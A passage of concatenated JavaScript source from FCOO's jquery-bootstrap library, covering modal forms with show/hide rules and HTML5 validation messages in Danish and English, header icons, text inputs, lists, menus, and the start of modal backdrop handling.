                case 'radiobuttongroup' : result = this.getRadioGroup().getSelected();  break;

                case 'selectbutton'     : result = $elem._bsSelectButton_getValue(); break;


                case 'slider'    :
                case 'timeslider': result = this._getSliderValue();              break;

                case 'text'      : result = ' ';                                 break;
                case 'hidden'    : result = $elem.val();                         break;
            }

            return result === null ? this.getResetValue() : result;
        },

        /*******************************************************
        onChanging
        *******************************************************/
        onChanging: function(){
            if (this.modalForm.isCreated){
                this.modalForm.showOrHide( this );
                this.modalForm.onChanging();
            }
        },

        /*******************************************************
        showOrHide
        Show or hide the input if any of the id:value in options.showWhen or hideWhen exists
        *******************************************************/
        showOrHide: function( values ){
            if (this.options.showWhen || this.options.hideWhen){
                var show = !this.options.showWhen; //If showWhen is given default is false = not show
                $.each( this.options.hideWhen || {}, function( userId, hideValue ){
                    var value = values[userId];
                    if ( ( $.isArray(hideValue) && (hideValue.indexOf(value) != -1)) ||
                         (!$.isArray(hideValue) && (hideValue == value))
                       )
                        show = false;
                });
                $.each( this.options.showWhen || {}, function( userId, showValue ){
                    var value = values[userId];
                    if ( ( $.isArray(showValue) && (showValue.indexOf(value) != -1)) ||
                         (!$.isArray(showValue) && (showValue == value))
                       )
                        show = true;
                });

                //Reset the validation if the field is hidden
                if (!show){
                    this.getElement().prop('disabled', false);
                    this.resetValue( true );
                }

                if (this.options.freeSpaceWhenHidden)
                    //When the element is invisible: Use display:none
                    this.getInputGroupContainer().toggleClass('d-none', !show);
                else
                    //When the element is invisible: Use visibility:hidden to keep structure of form and it elements
                    this.getInputGroupContainer().css('visibility', show ? 'visible' : 'hidden');

                this.getElement().prop('disabled', !show);
            }
            return this;
        }
    }; //End of BsModalInput.prototype


    /************************************************************************
    *************************************************************************
    BsModalForm( options )
    options:
        content: json-object with full content Samer as content for bsModal with extention of
            id = STRING
            showWhen and hideWhen = [id] of value: hide or show element when another element with id has value
            freeSpaceWhenHidden = BOOLEAN, when true the element will not appear in the form when it is hidden (as display: none). If false the space is allocated to the hidden element (as visibility: hidden)

        extended.content: Same as options.content, but NOT BOTH
        useExtended: false - When true the extended.content is used as the content of the form
        onChanging: function( values ) - called when the value of any of the elements are changed
        onSubmit  : function( values ) - called when the form is submitted
    *************************************************************************
    ************************************************************************/
    function BsModalForm( options ){
        var _this = this;
        this.options = $.extend(true, {}, defaultOptions, options );
        this.options.id = this.options.id || 'bsModalFormId' + formId++;

        this.options.onClose_user = this.options.onClose || function(){};
        this.options.onShow = $.proxy( this.onShow, this );
        this.options.onClose = $.proxy( this.onClose, this );

        //this.input = simple object with all input-elements. Also convert element-id to unique id for input-element
        this.inputs = {};

        var typeList = ['button', 'checkboxbutton', 'standardcheckboxbutton', 'iconcheckboxbutton',
                        'input', 'select', 'selectlist', 'selectbutton', 'radiobuttongroup', 'checkbox', 'radio', 'table', 'slider', 'timeslider', 'hidden', 'inputgroup', 'formControlGroup'],

            //semiSelectedValueTypes = {TYPE_ID:TYPE} TYPE_ID = the types that accept a semi-selected value. TYPE = the $.type result that detect if the value of a element is semi-selected
            semiSelectedValueTypes = {
                checkboxbutton          : {type: 'string' },
                standardcheckboxbutton  : {type: 'string' },
                checkbox                : {type: 'string' },
                radiobuttongroup        : {type: 'array',   addSemiSelectedClassToChild: true }
            };

        function setId( dummy, obj ){
            if ($.isPlainObject(obj) && (obj.type !== undefined) && typeList.includes(obj.type) && obj.id){
                var bsModalInput = new BsModalInput( obj, _this ),
                    onChangingFunc = $.proxy( bsModalInput.onChanging, bsModalInput ),
                    ssvt = semiSelectedValueTypes[obj.type];

                var canBeSemiSelected = bsModalInput.canBeSemiSelected = !!ssvt;
                bsModalInput.semiSelectedValueType       = canBeSemiSelected ? ssvt.type                        : null;
                bsModalInput.addSemiSelectedClassToChild = canBeSemiSelected ? ssvt.addSemiSelectedClassToChild : null;

                //Set options to call onChanging
                switch (obj.type){
                    case 'slider'    :
                    case 'timeslider': obj.onChanging = onChangingFunc; break;
                    default          : obj.onChange = onChangingFunc;
                }

                //Add element to inputs
                _this.inputs[obj.id] = bsModalInput;
            }
            else
                if ($.isPlainObject(obj) || ($.type(obj) == 'array'))
                    $.each( obj, setId );
        }


        if (this.options.extended && this.options.useExtended)
            setId( 'dummy', this.options.extended);
        else
            setId( 'dummy', this.options.content);

        //Create a hidden submit-button to be placed inside the form
        var $hiddenSubmitButton = this.$hiddenSubmitButton = $('<button type="submit" style="display:none"/>');

        //Add submit-button
        this.options.buttons.push({
            icon     : this.options.submitIcon,
            text     : this.options.submitText,
            className: 'primary min-width',
            focus    : true,
            onClick  : function(){ $hiddenSubmitButton.trigger('click'); }
        });

        this.options.show = false; //Only show using method edit(...)

        //Create the form
        var $form = this.$form = $('<form novalidate/>');
        if (this.options.extended && this.options.useExtended){
            $form._bsAppendContent( this.options.extended.content, this.options.contentContext, null, this.options );
            this.options.extended.content = $form;
        }
        else {
            $form._bsAppendContent( this.options.content, this.options.contentContext, null, this.options );
            this.options.content = $form;
        }

        //Create the modal
        this.$bsModal = $.bsModal( this.options );

        //Append the hidden submit-button the the form
        $form.append( $hiddenSubmitButton );

        //Get the button used to submit the form
        var bsModalDialog = this.$bsModal.data('bsModalDialog'),
            $buttons = bsModalDialog.bsModal.$buttons;

        this.$submitButton = $buttons[$buttons.length-1];


        //Add the validations
        this._eachInput( function( input ){
            if (input.options.validators){
                input.addValidation();
                $form.addClass('needs-validation form-validation');
            }
        });

        //Add onSubmit
        $form.on('submit', $.proxy(this.onSubmit, this) );

        return this;
    }

    /*******************************************************
    Export to jQuery
    *******************************************************/
    $.BsModalForm = BsModalForm;
    $.bsModalForm = function( options ){
        return new $.BsModalForm( options );
    };

    /*******************************************************
    Extend the prototype
    Methods marked with (*) are (almost) empty and must be defined
    with the used validator
    *******************************************************/
	$.BsModalForm.prototype = {

        /*******************************************************
        edit
        *******************************************************/
        edit: function( values, tabIndexOrId, semiSelected ){
            this.$bsModal.show();

            if (tabIndexOrId !== undefined)
                this.$bsModal.bsSelectTab(tabIndexOrId);

            this.setValues( values, true, semiSelected );
            this.originalValues = this.getValues();

            //Reset validation
            this.$bsModal.find(':disabled').prop('disabled', false );

            this.showOrHide( null );
            this.isCreated = true;
            this.onChanging();
        },

        /*******************************************************
        isDifferent( values ) - retur true if values is differnet from this.getValues()
        *******************************************************/
        isDifferent: function( values ){
            //Check if any of the new values are different from the original ones
            var newValues = this.getValues(),
                result = false;

            $.each( newValues, function(id, value){
                if (!values.hasOwnProperty(id) || (values[id] != value)){
                    result = true;
                    return false;
                }
            });

            return result;
        },

        /*******************************************************
        onShow
        *******************************************************/
        onShow: function(){
            this.$form.removeClass('was-validated');
        },

        /*******************************************************
        onClose
        *******************************************************/
        onClose: function(){
            //Check if any of the new values are different from the original ones
            if (!this.isDifferent(this.originalValues)){
                this.options.onClose_user();
                return true;
            }

            if (this.options.closeWithoutWarning){
                this.originalValues = this.getValues();
                if (this.options.onCancel)
                    this.options.onCancel(this.originalValues);
                return true;
            }

            var _this = this,
                noty = $.bsNoty({
                    type     : 'info',
                    modal    : true,
                    layout   :'center',
                    closeWith:['button'],
                    force    : true,
                    textAlign: 'center',
                    text     : {da:'Skal ændringeren gemmes?', en:'Do you want to save the changes?'},
                    buttons  : [
                        {
                            text: defaultOptions.closeText,
                            onClick: function(){
                                noty.close();
                            }
                        },
                        {
                            text:{da:'Gem ikke', en:'Don\'t Save'},
                            onClick: function(){
                                if (_this.options.onCancel)
                                    _this.options.onCancel(_this.originalValues);
                                _this.originalValues = _this.getValues();
                                noty.on('afterClose', function(){ _this.$bsModal.close(); });
                                noty.close();
                            }
                        },
                        {
                            text:{da:'&nbsp;&nbsp;&nbsp;&nbsp;Gem&nbsp;&nbsp;&nbsp;&nbsp;', en:'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Save&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'},
                            onClick: function(){
                                noty.on('afterClose', function(){ _this.$hiddenSubmitButton.trigger('click'); });
                                noty.close();
                            }
                        }
                    ]
                });
            return false;
        },


        /*******************************************************
        _eachInput
        *******************************************************/
        _eachInput: function( func ){
            $.each( this.inputs, function( id, input ){
                func( input );
            });
        },

        /*******************************************************
        getInput(id or userId)
        *******************************************************/
        getInput: function(id){
            var result = this.inputs[id];
            if (!result)
                this._eachInput( function( input ){
                    if (input.options.userId == id){
                        result = input;
                        return false;
                    }
                });
            return result;
        },

        /*******************************************************
        setValue
        *******************************************************/
        setValue: function(id, value){
            return this.inputs[id] ? this.inputs[id].setValue( value ) : null;
        },

        /*******************************************************
        setValues
        *******************************************************/
        setValues: function(values, resetUndefined){
            this._eachInput( function( input ){
                var value = values[input.options.userId];
                if ( value != undefined)
                    input.setValue(value);
                else
                    if (resetUndefined)
                        input.resetValue();
            });
        },

        /*******************************************************
        getValue
        *******************************************************/
        getValue: function(id){
            return this.inputs[id] ? this.inputs[id].getValue() : null;
        },

        /*******************************************************
        getValues
        *******************************************************/
        getValues: function(){
            var result = {};
            this._eachInput( function( input ){ result[input.options.userId] = input.getValue(); });
            return result;
        },

        /*******************************************************
        showOrHide - call showOrHide for all inputs except excludeInput
        *******************************************************/
        showOrHide: function( excludeInput ){
            var values = this.getValues();
            this._eachInput( function( input ){
                if (input !== excludeInput)
                    input.showOrHide( values );
            });
        },

        /*******************************************************
        onChanging = called every any of the element is changed
        *******************************************************/
        onChanging: function(){
            //Test if values used in last event-fire is different from current values
            if (this.isCreated && this.options.onChanging && this.isDifferent(this.onChangingValues || {})) {
                this.onChangingValues = this.getValues();
                this.options.onChanging( this.onChangingValues );
            }
        },

        /*******************************************************
        onSubmit = called when the form is valid and submitted
        *******************************************************/
        onSubmit: function( event/*, data*/ ){
            var form = this.$form.get(0);

            if (form.checkValidity()) {
                this.options.onSubmit ? this.options.onSubmit( this.getValues() ) : null;
                this.$bsModal._close();
                this.options.onClose_user();
                event.preventDefault();
            }
            else {
                event.preventDefault();
                event.stopPropagation();
            }
            this.$form.addClass('was-validated');
            return false;
        },

    };  //end of $.BsModalForm.prototype
}(jQuery, this, document));


;
/****************************************************************************
jquery-bootstrap-form-validation.js

Sets up default validation
See
https://developer.mozilla.org/en-US/docs/Learn/Forms/Form_validation
https://getbootstrap.com/docs/5.2/forms/validation/

****************************************************************************/
(function ($, i18next, window, document, undefined) {
	"use strict";


    /********************************************************************************
    In the options for BsModalForm each input can have options.validators =
        STRING or OBJ or []STRING/OBJ
    OBJ = {type: STRING, OPTIONS}

    type        OPTIONS
    required
    notEmpty

    range       min: NUMBER, max: NUMBER //one or two given
    length      min: NUMBER, max: NUMBER //one or two given
    TODO: type        type: STRING
    TODO: pattern     pattern: STRING

    If a input has more than one validatior the error contains info on all validators
    Eq. "The field is required - Must be between 1 and 10"

    ********************************************************************************/

    //Extend $.BsModalInput.prototype with methods to add validation to input-elements
    $.extend($.BsModalInput.prototype, {
        addValidation: function(){
            var validators          = this.options.validators,
                validatorList       = $.isArray(validators) ? validators : [validators],
                $element            = this.getElement(),
                $validationTooltip  = this.$validationTooltip =
                    $('<div/>')
                        .addClass('invalid-tooltip')
                        .insertAfter($element);


            var errorList   = [],
                firstError  = {},
                nextError   = {},
                prop        = {},
                attr        = {};


            function range(validator, postfix, minText, maxText, minMaxText, exactlyText){
                var min = validator.min,
                    max = validator.max;
                nextError =
                    min === undefined ? maxText :
                    max === undefined ? minText :
                    min == max ? exactlyText :
                    minMaxText;
                i18next.languages.forEach(function(lang){
                    nextError[lang] = nextError[lang] ? nextError[lang].replace('%min', min).replace('%max', max) : '';
                });

                if (min !== undefined){
                    attr['min'+postfix] = min;
                    prop.required = true;
                }

                if (max !== undefined)
                    attr['max'+postfix] = max;
            }

            validatorList.forEach(function(validator){
                validator = typeof validator == 'string' ? {type: validator} : validator;
                nextError = '';
                switch (validator.type.toUpperCase()){
                    case 'REQUIRED':
                    case 'NOTEMPTY' :
                        prop.required = true;
                        firstError = {da: "Feltet skal udfyldes", en: "The field is required"};
                        break;

                    case 'RANGE' :
                         range(validator, '',
                            {da: 'Skal mindst være %min',         en:'No less that %min'},              //minText
                            {da: 'Må højest være %max',           en:'No more than %max'},              //maxText
                            {da: 'Skal være mellem %min og %max', en:'Must be between %min and %max'},  //minMaxText
                            {da: 'Skal være præcis %min',         en:'Must be exactly %min'}            //exactlyText
                         );
                        break;

                    case 'LENGTH' :
                        range(validator, 'length',
                            {da: 'Skal mindst være %min tegn lang',         en:'No less that %min char long'},                  //minText
                            {da: 'Må højest være %max tegn lang',           en:'No more than %max char long'},                  //maxText
                            {da: 'Skal være mellem %min og %max tegn lang', en:'Must be between %min and %max characters long'},//minMaxText
                            {da: 'Skal være præcis %min tegn lang',         en:'Must be exactly %mincharacters long'}           //exactlyText
                        );
                        break;
                }
                if (nextError)
                    errorList.push(nextError);
            });

            $element.prop(prop);
            $element.attr(attr);

            if (firstError)
                errorList.unshift(firstError);
            var errorText = {};
            errorList.forEach(function(error){
                i18next.languages.forEach(function(lang){
                    var langText = errorText[lang] || '';
                    if (error[lang])
                        langText = langText + (langText.length ? '&nbsp;- ' : '') + error[lang];
                    errorText[lang] = langText;
                });
            });
            $validationTooltip._bsAddHtml({text: errorText});
        },
    });

}(jQuery, this.i18next, this, document));

/*
required                : Specifies whether a form field needs to be filled in before the form can be submitted.
minlength and maxlength : Specifies the minimum and maximum length of textual data (strings).
min and max             : Specifies the minimum and maximum values of numerical input types.
type                    : Specifies whether the data needs to be a number, an email address, or some other specific preset type.
pattern                 : Specifies a regular expression that defines a pattern the entered data needs to follow.


The following error-messages are taken from form-validation (not used anymore)
between     : {default: "Please enter a value between %s and %s", notInclusive: "Please enter a value between %s and %s strictly"}
callback    : {default: "Please enter a valid value"}
choice      : {default: "Please enter a valid value", less: "Please choose %s options at minimum", more: "Please choose %s options at maximum", between: "Please choose %s - %s options"}
color       : {default: "Please enter a valid color"}
creditCard  : {default: "Please enter a valid credit card number"}
date        : {default: "Please enter a valid date", min: "Please enter a date after %s", max: "Please enter a date before %s", range: "Please enter a date in the range %s - %s"}
different   : {default: "Please enter a different value"}
digits      : {default: "Please enter only digits"}
emailAddress: {default: "Please enter a valid email address"}
file        : {default: "Please choose a valid file"}
greaterThan : {default: "Please enter a value greater than or equal to %s", notInclusive: "Please enter a value greater than %s"}
identical   : {default: "Please enter the same value"}
integer     : {default: "Please enter a valid number"}
lessThan    : {default: "Please enter a value less than or equal to %s", notInclusive: "Please enter a value less than %s"}
notEmpty    : {default: "Please enter a value"}
numeric     : {default: "Please enter a valid float number"}
promise     : {default: "Please enter a valid value"}
regexp      : {default: "Please enter a value matching the pattern"}
remote      : {default: "Please enter a valid value"}
stringLength: {default: "Please enter a value with valid length", less: "Please enter less than %s characters", more: "Please enter more than %s characters", between: "Please enter value between %s and %s characters long"}
uri         : {default: "Please enter a valid URI"}
*/
;
/****************************************************************************
	jquery-bootstrap-header.js,

	(c) 2017, FCOO

	https://github.com/fcoo/jquery-bootstrap
	https://github.com/fcoo

****************************************************************************/

(function ($ /*, window, document, undefined*/) {
	"use strict";

    /*
    A header can contain any of the following icons:
    back (<)
    forward (>)
    extend (^)
    diminish
    pin
    unpin

    close (x)

    */

    //$.bsHeaderIcons = class-names for the different icons on the header. Set by function to allow updating $.FONTAWESOME_PREFIX_??
    $.bsHeaderIcons = {};
    $._set_bsHeaderIcons = function( forceOptions = {}){

        $.bsHeaderIcons = $.extend( $.bsHeaderIcons, {
            back    : 'fa-circle-chevron-left',
            forward : 'fa-circle-chevron-right',

            pin     : ['fas fa-thumbtack fa-inside-circle', $.FONTAWESOME_PREFIX_STANDARD + ' fa-circle'],
            unpin   : 'fa-thumbtack',

            extend  : 'fa-chevron-circle-up',
            diminish: 'fa-chevron-circle-down',


            new     : [ $.FONTAWESOME_PREFIX_STANDARD + ' fa-window-maximize fa-inside-circle2',
                        $.FONTAWESOME_PREFIX_STANDARD + ' fa-circle'  ],

            warning : [ 'fas fa-circle back text-warning',
                        $.FONTAWESOME_PREFIX_STANDARD + ' fa-circle',
                        'fas fa-exclamation fa-inside-circle-xmark'   ],

            info    : 'fa-circle-info',
            help    : 'fa-circle-question',

            close   : [ 'fas fa-circle show-for-hover fa-hover-color-red',
                        'fa-xmark fa-inside-circle-xmark fa-hover-color-white',
                        $.FONTAWESOME_PREFIX_STANDARD+' fa-circle' ]

        }, forceOptions );
    };
    $._set_bsHeaderIcons();

    //mandatoryHeaderIconClass = mandatory class-names and title for the different icons on the header
    var mandatoryHeaderIconClassAndTitle = {
        close  : {/*class:'',*/ title: {da:'Luk', en:'Close'}},
    };

    /******************************************************
    _bsHeaderAndIcons(options)
    Create the text and icon content of a header inside this
    options: {
        headerClassName: [string]
        icons: {
            back, forward, ..., close: { title: [string], disabled: [boolean], className: [string], altEvents: [string], onClick: [function] },
        }
    }
    ******************************************************/
    function checkDisabled( event ){
        var $target = $(event.target);
        if ($target.hasClass('disabled') || $target.prop('disabled'))
            event.stopImmediatePropagation();
    }

    $.fn._bsHeaderAndIcons = function(options){
        var $this = this;

        options = $.extend( true, {text:'DAVS MED DIG', headerClassName: '', inclHeader: true, icons: {} }, options );
        this.addClass( options.headerClassName );
        this.addClass('header-content');

        if (options.inclHeader){
            options.header = $._bsAdjustIconAndText(options.header);
            //If header contents more than one text => set the first to "fixed" so that only the following text are truncated
            if ($.isArray(options.header) && (options.header.length > 1)){
                options.header[0].textClass = 'fixed-header';
            }
            this._bsAddHtml( options.header || $.EMPTY_TEXT );
        }
        //Add icons (if any)
        if ( !$.isEmptyObject(options.icons) ) {
            //Container for icons
            var $iconContainer =
                    $('<div/>')
                        ._bsAddBaseClassAndSize( {
                            baseClass   :'header-icon-container',
                            useTouchSize: true
                        })
                        .appendTo( this );

            //Add icons
            $.each( ['back', 'forward', 'pin', 'unpin', 'extend', 'diminish', 'new', 'warning', 'info', 'help', 'close'], function( index, id ){
                var iconOptions = options.icons[id],
                    classAndTitle = mandatoryHeaderIconClassAndTitle[id] || {};

                if (iconOptions && iconOptions.onClick){
                    var icon = iconOptions.icon || $.bsHeaderIcons[id];
                    icon = $.isArray(icon) ? icon : [icon];

                    $._bsCreateIcon(
                        icon,
                        $iconContainer,
                        iconOptions.title || classAndTitle.title || '',
                        (iconOptions.className || '') + ' header-icon ' + (classAndTitle.class || '')
                    )
                    .toggleClass('hidden', !!iconOptions.hidden)
                    .toggleClass('disabled', !!iconOptions.disabled)
                    .attr('data-header-icon-id', id)
                    .on('click', checkDisabled)
                    .on('click', iconOptions.onClick);

                    //Add alternative (swipe) event
                    if (iconOptions.altEvents)
                        $this.on( iconOptions.altEvents, iconOptions.onClick );
                }
            });
        }
        return this;
    };

}(jQuery, this, document));
;
/****************************************************************************
	jquery-bootstrap-input.js,

	(c) 2017, FCOO

	https://github.com/fcoo/jquery-bootstrap
	https://github.com/fcoo

****************************************************************************/

(function ($ /*, window, document, undefined*/) {
	"use strict";

    $.extend({
        /******************************************************
        $.bsInput( options )
        Create a <input type="text" class="form-control"> inside a <label>
        Also add input-mask using https://github.com/RobinHerbots/Inputmask
        ******************************************************/
        bsInput: function( options ){
            if (options.inputmask)
                options.placeholder = null;

            var $input =
                    $('<input/>')
                        ._bsAddIdAndName( options )
                        ._bsAddBaseClassAndSize({baseClass: 'form-control', useTouchSize: true})
                        .attr('type', 'text');

            if (options.inputmask){
                /* NOT USED FOR NOW
                var updateFunc = $.proxy($input._onInputmaskChanged, $input);
                options.inputmask.oncomplete   = options.inputmask.oncomplete   || updateFunc;
                options.inputmask.onincomplete = options.inputmask.onincomplete || updateFunc;
                options.inputmask.oncleared    = options.inputmask.oncleared    || updateFunc;
                */

                //Bug fix in chrome: Keep mask in input to prevent label "flicking"
                options.inputmask.clearMaskOnLostFocus = false;

                $input.inputmask(options.inputmask);
            }

            return $input._wrapLabel(options);
        },

    });


    $.fn.extend({
        /* NOT USED FOR NOW
        _onInputmaskChanged: function( inputmaskStatus ){
            var $this = $(this);
            $(this).closest('.input-group-container').toggleClass('has-warning', !$this.inputmask("isComplete"));
            $(this).closest('.input-group').toggleClass('has-warning', !$this.inputmask("isComplete"));
        },
        */

        /******************************************************
        _wrapLabel( options )
        Wrap the element inside a <label> and add
        options.placeholder and options.label
            <label class="label-inside">
                <THIS placeholder="options.placeholder"/>
                <span>options.label</span>
            </label>
        Return the label-element
        ******************************************************/
        _wrapLabel: function(options){
            var $label = $('<label/>')
                            .addClass('label-inside')
                            .append( this );

            if (options.placeholder)
                this.i18n( options.placeholder, 'placeholder' );

            $('<span/>')
                ._bsAddHtml( options.label )
                .addClass('label-content')
                .appendTo( $label )
                .on('mouseenter', function(){ $label.addClass('hover');    })
                .on('mouseleave', function(){ $label.removeClass('hover'); });

            return $label;
        },
    });


}(jQuery, this, document));
;
/****************************************************************************
	jquery-bootstrap-list.js,

	(c) 2017, FCOO

	https://github.com/fcoo/jquery-bootstrap
	https://github.com/fcoo

****************************************************************************/

(function ($/*, window, document, undefined*/) {
	"use strict";

/******************************************************************
bsList( options )
options
    columns = [] of {
        vfFormat,
        vfOptions:  The content of a element can be set and updated using [jquery-value-format].
                    The options vfFormat and (optional) vfOptions defines witch format used to display the content

        align        :  'left','center','right'. Defalut = 'left'
        verticalAlign: 'top', 'middle','bottom'. Default = 'middle'
        noWrap       : false. If true the column will not be wrapped = fixed width
    }

    verticalBorder: [boolean] true. When true vertical borders are added together with default horizontal borders
    noBorder      : [boolean] true. When true no borders are visible

    align        : 'left','center','right'. Defalut = 'left' = default align for all columns
    verticalAlign: 'top', 'middle','bottom'. Default = 'middle' = default verticalAlign for all columns



*******************************************************************/
    var defaultColunmOptions = {
            align        : 'left',
            verticalAlign: 'middle',
            noWrap       : false,
            truncate     : false,
            sortable     : false
        },

        defaultOptions = {
            showHeader      : false,
            verticalBorder  : false,
            noBorder        : true,
            hoverRow        : false,
            noPadding       : true,

            align           : defaultColunmOptions.align,
            verticalAlign   : defaultColunmOptions.verticalAlign,

            content         : []
        };

    $.bsList = function( options ){
        //Adjust options but without content since it isn't standard
        var content = options.content;
        options.content = [];
        options = $._bsAdjustOptions( options, defaultOptions );
        options.content = content;

        var nofColumns = 1;
        //Adjust options.content and count number of columns
        $.each(options.content, function( index, rowContent ){
            rowContent = $.isArray( rowContent ) ? rowContent : [rowContent];
            nofColumns = Math.max(nofColumns, rowContent.length);

            var rowContentObj = {};
            $.each(rowContent, function( index, cellContent ){
                rowContentObj['_'+index] = cellContent;
            });

            options.content[index] = rowContentObj;
        });

        options.columns = options.columns || [];
        var optionsAlign = {
                align        : options.align,
                verticalAlign: options.verticalAlign
            };

        //Create columns-options for bsTable
        for (var i=0; i<nofColumns; i++ )
            options.columns[i] = $.extend({id:'_'+i}, defaultColunmOptions, optionsAlign, options.columns[i]);

        return $.bsTable( options );
    };
}(jQuery, this, document));
;
/****************************************************************************
	jquery-bootstrap-menu.js,

	(c) 2019, FCOO

	https://github.com/fcoo/jquery-bootstrap
	https://github.com/fcoo

****************************************************************************/

(function ($, window, document, undefined) {
	"use strict";

    /**********************************************************
    bsMenu( options ) - create a group of menu-items.
    Each item can be a header, radio-button, checkbox-button or standard button

    options:
        //any options from list as global/default values

        fullWidth: [BOOLEAN]. false

        list: [] of {

            id  : [STRING], null => type='header'
            type: [STRING], 'header'/'button'/'radio'/'checkbox'

            radioGroupId/radioId: [STRING]. Not null  => type = 'radio'
            list: [] of {icon, text} . ONLY for type == 'radio'

            onChange: function(id, selected [$buttonGroup]). Not null => type = 'checkbox' (if radioGroupId == null)
            onClick: function(id). Not null => type = 'button'
            selected: [BOOLEAN] or function(id [, radioGroupId]) - return true if the item is selected (both rsdio and checkbox)
            disabled: [BOOLEAN] or function(id [, radioGroupId]) - return true if the item is disabled
            hidden  : [BOOLEAN] or function(id [, radioGroupId]) - return true if the item is hidden

            lineBefore: [BOOLEAN] - insert a <hr> before the item
            lineAfter : [BOOLEAN] - insert a <hr> after the item

        }

    **********************************************************/
    function nothing(){ return false; }
    function allways(){ return true; }

    function updateBsMenu(){
        var options = this.data('bsMenu_options');

        //Update all items
        var $firstItem, $lastItem;
        $.each(options.list, function(index, itemOptions){
            var $item  = itemOptions.$item,
                hidden = !!itemOptions.hidden();

            $item.removeClass('first last');
            hidden ? $item.hide() : $item.show();
            $item.toggleClass('disabled', !!itemOptions.disabled() );

            if (!hidden){
                $firstItem = $firstItem || $item;
                $lastItem = $item;
            }
        });

        if ($firstItem)
            $firstItem.addClass('first');
        if ($lastItem)
            $lastItem.addClass('last');
    }

    $.bsMenu = function( options = {}){
        //Adjust options.list
        var list = options.list = options.list || [];
        $.each(list, function(index, itemOptions){

            //Set type from other values
            if (!itemOptions.type){
                if (itemOptions.radioGroupId)
                    itemOptions.type = 'radio';
                else
                if (itemOptions.onChange)
                    itemOptions.type = 'checkbox';
                else
                if (itemOptions.onClick)
                    itemOptions.type = 'button';
                else
                if (itemOptions.content)
                    itemOptions.type = 'content';
            }

            //Use default values
            function setDefault(id){
                if (itemOptions[id] === undefined)
                    itemOptions[id] = options[id] || nothing;
                if (!$.isFunction(itemOptions[id]))
                    itemOptions[id] = itemOptions[id] ? allways : nothing;
            }

            if ((itemOptions.type == 'radio') || (itemOptions.type == 'checkbox')){

                itemOptions.radioGroupId = itemOptions.radioGroupId || itemOptions.radioId || itemOptions.id;
                itemOptions.id = itemOptions.radioGroupId; //To prevent no-close-on-click in popover

                setDefault('onChange');

                //Allow selected as function
                setDefault('selected');
                itemOptions.isSelected = itemOptions.selected;
                itemOptions.selected = itemOptions.isSelected();
            }

            if (itemOptions.type == 'button')
                setDefault('onClick');

            setDefault('disabled');
            setDefault('hidden');
        });

        //Create bsButtonGroup, but without any buttons (for now)
        var $result       = $.bsButtonGroup( $.extend({}, options, {class:'bs-menu-container', center: false, vertical: true, list: [] }) ),
            $previousItem = null,
            spaceAfter    = false;

        //Append the items
        $.each(list, function(index, itemOptions){
            var $item = null,
                isItemWithSpaceAfter = false,
                radioGroup = null;

            itemOptions.small = options.small;

            switch (itemOptions.type){
                case 'button'                :
                case 'checkboxbutton'        :
                case 'standardcheckboxbutton':
                case 'iconcheckboxbutton'    :
                    $item = $._anyBsButton($.extend(itemOptions, {returnFromClick: true}));
                    isItemWithSpaceAfter = true;
                    break;

                case 'checkbox':
                    $item = $.bsStandardCheckboxButton(itemOptions);
                    isItemWithSpaceAfter = true;
                    break;

                case 'radio':
                    $item = $.bsRadioButtonGroup( $.extend({vertical: true, fullWidth: true}, itemOptions));
                    radioGroup = $item.data('radioGroup');
                    isItemWithSpaceAfter = true;
                    break;

                case 'content':
                    var content = itemOptions.content;
                    if (content instanceof $)
                        $item = content.clone(true);
                    else
                        $item = $('<div/>')._bsAddHtml( content );
                    break;

                default:
                    //A header
                    $item = $('<div/>')
                                .addClass('btn header-content')
                                .toggleClass('header-main', !!itemOptions.mainHeader)
                                ._bsAddHtml( itemOptions );
                    itemOptions.spaceBefore = true;
            }

            $item.addClass(itemOptions.class);

            if (isItemWithSpaceAfter)
                $item.addClass('text-truncate');

            if ((itemOptions.spaceBefore || itemOptions.lineBefore || spaceAfter) && $previousItem){
                $previousItem.addClass('space-after');
            }
            spaceAfter = itemOptions.spaceAfter || itemOptions.lineAfter;

            $previousItem = isItemWithSpaceAfter ? $item : null;

            $result.append($item);

            options.list[index].$item = $item;
            options.list[index].radioGroup = radioGroup;

        });
        $result.data('bsMenu_options', options);
        var update = $.proxy(updateBsMenu, $result);
        $result.on('click', update);

        update();

        return $result;
    };

    function eachBsMenuListItem( itemFunc, values, $this ){
        $.each($this.data('bsMenu_options').list, function(index, item){
            if (item.id && ( (item.type == 'checkbox') || (item.type == 'radio') ) )
                itemFunc(item, values, $this );
        });
        return values;
    }

    $.fn._bsMenu_getValues = function(){
        var values = {};
        eachBsMenuListItem(
            function( item, values ){
                switch (item.type){
                    case 'checkbox':
                        values[item.id] = item.$item._cbxGet();
                        break;
                    case 'radio':
                        values[item.id] = item.radioGroup.getSelected();
                        break;
                }
            },
            values,
            this
        );
        return values;
    };

    $.fn._bsMenu_setValues = function(values){
        eachBsMenuListItem(
            function( item, values ){
                var newValue = values[item.id];
                if (newValue !== undefined){
                    switch (item.type){
                        case 'checkbox':
                            if (item.$item._cbxGet() != newValue)
                                item.$item._cbxSet( newValue );
                            break;
                        case 'radio':
                            if (item.radioGroup.getSelected() != newValue)
                                item.radioGroup.setSelected( newValue );
                            break;
                    }
                }
            },
            values,
            this
        );
        return values;
    };
}(jQuery, this, document));
;
/****************************************************************************
	jquery-bootstrap-modal-backdrop.js,

	(c) 2017, FCOO

	https://github.com/fcoo/jquery-bootstrap
	https://github.com/fcoo


    Global methods to provide backdrop for modal windows and noty

****************************************************************************/

(function ($, window/*, document, undefined*/) {
	"use strict";

    $.bsZIndexModalBackdrop = 1050; //MUST be equal to $zindex-modal-backdrop in bootstrap/scss/_variables.scss

    var zindexAllwaysOnTop  = 9999,
        modalBackdropLevels = 0,

        $modalBackdrop_current = null,
        $modalBackdrop = null,
        $modalTransparentBackdrop = null;

    /******************************************************
    $.fn._setModalBackdropZIndex
    Set the z-index of this to the current level
    If a className is given => use it, else
    If delta === true the z-index is set to zindexAllwaysOnTop (9999), else
    increase current z-index by 10
    ******************************************************/
    $.fn._setModalBackdropZIndex = function( delta, className ){
        if (className)
            this.addClass( className );
        else
            this.css('z-index', delta === true ? zindexAllwaysOnTop : $.bsZIndexModalBackdrop + modalBackdropLevels*10  + (delta?delta:0));
        return this;
    };

    /******************************************************
    $._addModalBackdropLevel
    Move the backdrop up in z-index
    ******************************************************/
    function addAnyModalBackdropLevel( $modalBD, transparent ){
        modalBackdropLevels++;

        if (!$modalBD)
            $modalBD =
                $('<div/>')
                    .append( $('<i/>')._bsAddHtml({icon:'fa-spinner fa-spin'}) )
